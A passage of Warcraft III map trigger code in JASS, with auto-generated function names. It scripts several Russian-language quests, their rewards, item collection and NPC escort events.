if not (GetUnitLevel(GetTriggerUnit())>=32) then
return false
endif
return true
endfunction
function BcI takes nothing returns nothing
if BcH() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[53])
call AddSpecialEffectTargetUnitBJ("overhead",Ji,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[53]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Последний сухопутный\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 32-40|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Последний сухопутный","|c006969FFУровень задания: 32-40|r
Экспедиция по уничтожению опасных морских врагов почти завершена. Остался один лишь Морлок, который спрятался где-то в водных глубинах.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[53]=GetLastCreatedQuestBJ()
call ShowUnit(LI,true)
call PauseUnit(LI,false)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000032|r уровня",.027,255,255,255)
endif
endfunction
function BcJ takes nothing returns nothing
set cr=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cr,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cr,Condition(function BcG))
call TriggerAddAction(cr,function BcI)
endfunction
function BcK takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303454) then
return false
endif
return true
endfunction
function BcL takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303250) then
return false
endif
return true
endfunction
function BcM takes nothing returns nothing
if BcK() then
set Vz=GetRectCenter(F5)
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(Vz)
else
endif
if BcL() then
set Vz=GetRectCenter(F6)
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(Vz)
else
endif
endfunction
function BcN takes nothing returns nothing
set cs=CreateTrigger()
call TriggerRegisterLeaveRectSimple(cs,F5)
call TriggerRegisterLeaveRectSimple(cs,F6)
call TriggerAddAction(cs,function BcM)
endfunction
function BcO takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BcP takes nothing returns nothing
call SetUnitLifePercentBJ(LI,100)
call SetUnitLifePercentBJ(LJ,100)
endfunction
function BcQ takes nothing returns nothing
set ct=CreateTrigger()
call TriggerRegisterEnterRectSimple(ct,F6)
call TriggerRegisterEnterRectSimple(ct,F5)
call TriggerAddCondition(ct,Condition(function BcO))
call TriggerAddAction(ct,function BcP)
endfunction
function BcR takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BcS takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(1.)
if BcR() then
call SetUnitInvulnerable(GetTriggerUnit(),true)
call PauseUnit(GetTriggerUnit(),true)
call DisplayTextToForce(GetPlayersAll(),"|c007d7d7dРазведчик|r: не убивайте, достаточно... Я всё скажу. По пути к Гидре есть небольшой островок, вот там скрывается проход к боссу. Только не убивайте..")
call ShowUnit(LJ,true)
call PauseUnit(LJ,false)
call KillDestructable(Hr)
else
endif
endfunction
function BcT takes nothing returns nothing
set cu=CreateTrigger()
call TriggerRegisterUnitStateEvent(cu,LI,UNIT_STATE_LIFE,LESS_THAN,50000.)
call TriggerAddAction(cu,function BcS)
endfunction
function BcU takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303454) then
return false
endif
return true
endfunction
function BcV takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303250) then
return false
endif
return true
endfunction
function BcW takes nothing returns nothing
if BcU() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Задание провалено! Вам не удалось добыть из разведчика информацию, вы его убили.
")
else
endif
if BcV() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Задание выполнено! Вернитесь за наградой")
call DestroyEffectBJ(Us[53])
call AddSpecialEffectTargetUnitBJ("overhead",Ji,"war3mapImported\\QuestYellow1.mdx")
set Us[53]=GetLastCreatedEffectBJ()
call EnableTrigger(cw)
else
endif
endfunction
function BcX takes nothing returns nothing
set cv=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cv,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(cv,function BcW)
endfunction
function BcY takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$456D6F6F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BcZ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bca takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function Bcb takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function Bcc takes nothing returns boolean
return GetBooleanAnd(Bca(),Bcb())
endfunction
function Bcd takes nothing returns boolean
return GetBooleanAnd(BcZ(),Bcc())
endfunction
function Bce takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=32) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=40) then
return false
endif
return true
endfunction
function Bcf takes nothing returns nothing
if Bce() then
call AddHeroXP(GetEnumUnit(),7000,false)
else
endif
endfunction
function Bcg takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=32) then
return false
endif
return true
endfunction
function Bch takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=32) then
return false
endif
return true
endfunction
function Bci takes nothing returns nothing
if Bch() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[53])
call QuestSetCompletedBJ(YX[53],true)
call DestroyQuest(YX[53])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF7000 опыта|r, |c00ffff00400 золота|r, |c00ff969620 Кровавых Меток")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FFFF00Экспедиция завершена. Благодарю за помощь")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function Bcd))
call ForGroupBJ(Th,function Bcf)
call DestroyGroup(Th)
set Sf=Sf+1
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if Bcg() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000032|r уровня",.027,255,255,255)
endif
endfunction
function Bcj takes nothing returns nothing
set cw=CreateTrigger()
call DisableTrigger(cw)
call TriggerRegisterAnyUnitEventBJ(cw,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cw,Condition(function BcY))
call TriggerAddAction(cw,function Bci)
endfunction
function Bck takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68776174) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bcl takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[55])
call AddSpecialEffectTargetUnitBJ("overhead",Io,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[55]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Бывший союзник\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 51+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Последний сухопутный","|c006969FFУровень задания: 51+|r
Моё тело мертво,но мой дух продолжает жить. Пафосно звучит. не так ли? Но тем не менее, имеем то, что имеем. Какие-то уроды меня убили, не дав мне возможности отомстить своему бывшему напарнику по оружию. Эх, Асмодеус... Вместе с тобой мы шли в бой, уничтожали всё, что встречалось на пути. А потом этот сукин сын пошел учится магии у водяных чародеев и забыл обо мне. Предайте его тело праху, и я открою.вам тайну, ценой во всю мою жизнь.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[55]=GetLastCreatedQuestBJ()
endfunction
function Bcm takes nothing returns nothing
set cx=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cx,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cx,Condition(function Bck))
call TriggerAddAction(cx,function Bcl)
endfunction
function Bcn takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68776174) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bco takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305731)==true) then
return false
endif
return true
endfunction
function Bcp takes nothing returns nothing
if Bco() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($4930324E,GetUnitLoc(GetTriggerUnit()))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305731))
call DestroyQuest(YX[55])
else
call DisplayTextToForce(GetPlayersAll(),"|C00ffff00Дух Джека:|r итак, как и обещал. Существует некое писание, \"Кодекс Некромантов\", в котором прописаны основные правила, законы и заклинания темной магии воскрешения мертвых. 10 страниц Кодекса были украдены недоброжелателями, отыщите их и я смогу синтезировать для Вас Душу Асмодеуса.")
endif
endfunction
function Bcq takes nothing returns nothing
set cy=CreateTrigger()
call DisableTrigger(cy)
call TriggerRegisterAnyUnitEventBJ(cy,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cy,Condition(function Bcn))
call TriggerAddAction(cy,function Bcp)
endfunction
function Bcr takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local item c0=GetManipulatedItem()
local texttag Mc
if GetItemTypeId(c0)==$49305732 then
set VO=VO+1
set Mc=CreateTextTag()
call SetTextTagText(Mc,I2S(VO)+"/10",.025)
call SetTextTagPosUnit(Mc,Hu,50)
call SetTextTagColor(Mc,255,0,255,255)
call SetTextTagVelocity(Mc,0,.03)
call SetTextTagVisibility(Mc,true)
call SetTextTagFadepoint(Mc,2)
call SetTextTagLifespan(Mc,2)
call SetTextTagPermanent(Mc,false)
call SetTextTagSuspended(Mc,false)
if VO>=10 then
call UnitAddItemByIdSwapped($49305731,Hu)
endif
endif
set Hu=null
set c0=null
endfunction
function Bcs takes nothing returns nothing
set cz=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cz,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(cz,function Bcr)
endfunction
function Bct takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F626C61) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bcu takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Магические сталагмиты\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 52-53|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Магические сталагмиты
","|c006969FFУровень задания: 52-53|r
Ну вот вы и добрались сюда. Путь был долгим, не правда ли? Вашей следующей целью будет помочь нам уничтожить лагерь нежити неподалеку, но начнем мы с малого. В этих пустошах мы установили 5 магических сталагмитов, которые давали нам обзор всего в округе. Они погасли, и это бега. активируйте их, нам нужна их магия. Каждый заряжается специальным камнем, которые похитили враги. у каждого класса врагов - по одному камню. Добудьте их и активируйте сталагмиты!","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[54]=GetLastCreatedQuestBJ()
endfunction
function Bcv takes nothing returns nothing
set c1=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(c1,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(c1,Condition(function Bct))
call TriggerAddAction(c1,function Bcu)
endfunction
function Bcw takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(PLAYER_NEUTRAL_AGGRESSIVE)) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())==11) then
return false
endif
return true
endfunction
function Bcx takes nothing returns boolean
if not (GetRandomInt(1,15)==1) then
return false
endif
return true
endfunction
function Bcy takes nothing returns nothing
if Bcx() then
call CreateItemLoc($49303441,GetUnitLoc(GetTriggerUnit()))
else
endif
endfunction
function Bcz takes nothing returns nothing
set c2=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(c2,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(c2,Condition(function Bcw))
call TriggerAddAction(c2,function Bcy)
endfunction
function Bc0 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49303441)==true) then
return false
endif
return true
endfunction
function Bc1 takes nothing returns boolean
if not (SJ[376]>=5.) then
return false
endif
return true
endfunction
function Bc2 takes nothing returns boolean
if not (RectContainsUnit(GE,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bc3 takes nothing returns boolean
if not (SJ[376]>=5.) then
return false
endif
return true
endfunction
function Bc4 takes nothing returns boolean
if not (RectContainsUnit(GD,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bc5 takes nothing returns boolean
if not (SJ[376]>=5.) then
return false
endif
return true
endfunction
function Bc6 takes nothing returns boolean
if not (RectContainsUnit(GC,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bc7 takes nothing returns boolean
if not (SJ[376]>=5.) then
return false
endif
return true
endfunction
function Bc8 takes nothing returns boolean
if not (RectContainsUnit(GB,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bc9 takes nothing returns boolean
if not (SJ[376]>=5.) then
return false
endif
return true
endfunction
function BdB takes nothing returns boolean
if not (RectContainsUnit(F9,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BdC takes nothing returns nothing
if Bc2() then
call SetDoodadAnimationRectBJ("Stand Work",$44303245,GE)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303441))
call RemoveRect(GE)
set SJ[376]=SJ[376]+1.
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFКамней активировано: |r"+(I2S(R2I(SJ[376]))+"/|c00ffff005"))
if Bc1() then
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFВсе камни активированы!")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c4)
call DisableTrigger(c2)
else
endif
else
endif
if Bc4() then
call SetDoodadAnimationRectBJ("Stand Work",$44303245,GD)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303441))
call RemoveRect(GD)
set SJ[376]=SJ[376]+1.
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFКамней активировано: |r"+(I2S(R2I(SJ[376]))+"/|c00ffff005"))
if Bc3() then
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFВсе камни активированы!")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c4)
call DisableTrigger(c2)
else
endif
else
endif
if Bc6() then
call SetDoodadAnimationRectBJ("Stand Work",$44303245,GC)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303441))
call RemoveRect(GC)
set SJ[376]=SJ[376]+1.
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFКамней активировано: |r"+(I2S(R2I(SJ[376]))+"/|c00ffff005"))
if Bc5() then
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFВсе камни активированы!")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c4)
call DisableTrigger(c2)
else
endif
else
endif
if Bc8() then
call SetDoodadAnimationRectBJ("Stand Work",$44303245,GB)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303441))
call RemoveRect(GB)
set SJ[376]=SJ[376]+1.
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFКамней активировано: |r"+(I2S(R2I(SJ[376]))+"/|c00ffff005"))
if Bc7() then
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFВсе камни активированы!")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c4)
call DisableTrigger(c2)
else
endif
else
endif
if BdB() then
call SetDoodadAnimationRectBJ("Stand Work",$44303245,F9)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303441))
call RemoveRect(F9)
set SJ[376]=SJ[376]+1.
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFКамней активировано: |r"+(I2S(R2I(SJ[376]))+"/|c00ffff005"))
if Bc9() then
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFВсе камни активированы!")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("overhead",Kl,"war3mapImported\\QuestYellow1.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c4)
call DisableTrigger(c2)
else
endif
else
endif
endfunction
function BdD takes nothing returns nothing
set c3=CreateTrigger()
call TriggerRegisterEnterRectSimple(c3,GE)
call TriggerRegisterEnterRectSimple(c3,GD)
call TriggerRegisterEnterRectSimple(c3,GC)
call TriggerRegisterEnterRectSimple(c3,GB)
call TriggerRegisterEnterRectSimple(c3,F9)
call TriggerAddCondition(c3,Condition(function Bc0))
call TriggerAddAction(c3,function BdC)
endfunction
function BdE takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F626C61) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdF takes nothing returns boolean
if not (RectContainsUnit(GV,MT[GetForLoopIndexA()-1])==true) then
return false
endif
if not (GetUnitLevel(MT[GetForLoopIndexA()-1])==52) then
return false
endif
return true
endfunction
function BdG takes nothing returns boolean
if not BdF() then
return false
endif
return true
endfunction
function BdH takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=52) then
return false
endif
return true
endfunction
function BdI takes nothing returns nothing
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=8
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
if BdG() then
call SuspendHeroXPBJ(true,MT[GetForLoopIndexA()-1])
set S2[GetForLoopIndexA()]=true
call SetHeroLevel(MT[GetForLoopIndexA()-1],53,true)
set S2[GetForLoopIndexA()]=false
call SuspendHeroXPBJ(false,MT[GetForLoopIndexA()-1])
else
endif
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(c5)
call DestroyEffectBJ(Us[54])
call QuestSetCompletedBJ(YX[54],true)
call DestroyQuest(YX[54])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00ffff001400 золота|r, |c00ff9696100 Кровавых Меток")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FFFF00Спасибо за помощь, но это ещё далеко не конец. Обратитесь к Минотавру, он обьяснит Вам детали предстоящего сражения.")
set Sf=Sf+1
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BdH() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+4200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+300
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
call AddSpecialEffectTargetUnitBJ("origin",Ko,"war3mapImported\\TalkToMev2.mdx")
set Us[54]=GetLastCreatedEffectBJ()
endfunction
function BdJ takes nothing returns nothing
set c4=CreateTrigger()
call DisableTrigger(c4)
call TriggerRegisterAnyUnitEventBJ(c4,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(c4,Condition(function BdE))
call TriggerAddAction(c4,function BdI)
endfunction
function BdK takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F746175) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdL takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(c6)
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("origin",Ko,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Освобождение пленников\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 53-54|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Освобождение пленников","|c006969FFУровень задания: 53-54|r
Мы практически готовы нападать и уничтожать врагов, осталось только освободить наших полководцев из плена. Это недалеко, в пустошах. Ведь без командывания наша армия будет безнадежно слаба. Вытащите великих командиров, и мы начнем.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[54]=GetLastCreatedQuestBJ()
endfunction
function BdM takes nothing returns nothing
set c5=CreateTrigger()
call DisableTrigger(c5)
call TriggerRegisterAnyUnitEventBJ(c5,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(c5,Condition(function BdK))
call TriggerAddAction(c5,function BdL)
endfunction
function BdN takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F736864) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdO takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F746368) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdP takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4F666172) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdQ takes nothing returns nothing
if BdN() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call IssueTargetOrderBJ(GetOrderTargetUnit(),"smart",GetTriggerUnit())
else
endif
if BdO() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call IssueTargetOrderBJ(GetOrderTargetUnit(),"smart",GetTriggerUnit())
else
endif
if BdP() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call IssueTargetOrderBJ(GetOrderTargetUnit(),"smart",GetTriggerUnit())
else
endif
endfunction
function BdR takes nothing returns nothing
set c6=CreateTrigger()
call DisableTrigger(c6)
call TriggerRegisterAnyUnitEventBJ(c6,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(c6,function BdQ)
endfunction
function BdS takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$4F666172 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$4F746368 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$4F736864 then
return true
endif
return false
endfunction
function BdT takes nothing returns boolean
if not BdS() then
return false
endif
return true
endfunction
function BdU takes nothing returns boolean
if not (RectContainsUnit(GO,Jj)==true) then
return false
endif
if not (RectContainsUnit(GO,JS)==true) then
return false
endif
if not (RectContainsUnit(GO,JT)==true) then
return false
endif
return true
endfunction
function BdV takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),Location(18730.,1881.))
call SetUnitOwner(GetTriggerUnit(),Player(8),true)
if BdU() then
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(c6)
call DisplayTextToForce(GetPlayersAll(),"|cFF0080FFОтлично! Все в сборе. Подойдите к Минотавру для сдачи задания и получения информации о дальнейших действиях")
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Для получения особой награды герои должны находится с лагере Орды при сдаче задания")
call DestroyQuest(YX[54])
call DestroyEffectBJ(Us[54])
call AddSpecialEffectTargetUnitBJ("origin",Ko,"war3mapImported\\TalkToMev2.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call EnableTrigger(c8)
else
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Еще один с нами!")
endif
endfunction
function BdW takes nothing returns nothing
set c7=CreateTrigger()
call TriggerRegisterEnterRectSimple(c7,GO)
call TriggerAddCondition(c7,Condition(function BdT))
call TriggerAddAction(c7,function BdV)
endfunction
function BdX takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F746175) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BdY takes nothing returns boolean
if not (RectContainsUnit(GV,MT[GetForLoopIndexA()-1])==true) then
return false
endif
if not (GetUnitLevel(MT[GetForLoopIndexA()-1])==53) then
return false
endif
return true
endfunction
function BdZ takes nothing returns boolean
if not BdY() then
return false
endif
return true
endfunction
function Bda takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=8
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
if BdZ() then
call SuspendHeroXPBJ(true,MT[GetForLoopIndexA()-1])
set S2[GetForLoopIndexA()]=true
call SetHeroLevel(MT[GetForLoopIndexA()-1],54,true)
set S2[GetForLoopIndexA()]=false
call SuspendHeroXPBJ(false,MT[GetForLoopIndexA()-1])
else
endif
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call DestroyEffectBJ(Us[54])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Минотавр:|r Мы готовы к наступлению! Через 15 секунд полководцы выдвинутся в сторону вражеской базы. У нас нет возможности привести армию, так как все наши войска были перебиты, поэтому нам потребуется ваша помощь. А, и чуть не забыл. Ворота в лагерь врагов не поддаются обычному оружию, поэтому с вами отправится наша катапульта, которая уничтожит преграду.")
call TriggerSleepAction(15.)
call EnableTrigger(c9)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Войска выдвинулись в сторону базы врагов. Победите босса Нежити, дабы не потерять уважение в глазах Орды.
|c00ff9696Внимание:|r полководцы должны выжить, а также защищайте Катапульту до тех пор, пока она не уничтожит ворота.")
endfunction
function Bdb takes nothing returns nothing
set c8=CreateTrigger()
call DisableTrigger(c8)
call TriggerRegisterAnyUnitEventBJ(c8,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(c8,Condition(function BdX))
call TriggerAddAction(c8,function Bda)
endfunction
function Bdc takes nothing returns nothing
set V0=GetRectCenter(GS)
call IssuePointOrderLoc(Kp,"attack",V0)
call IssuePointOrderLoc(JT,"attack",V0)
call IssuePointOrderLoc(JS,"attack",V0)
call IssuePointOrderLoc(Jj,"attack",V0)
call RemoveLocation(V0)
endfunction
function Bdd takes nothing returns nothing
set c9=CreateTrigger()
call DisableTrigger(c9)
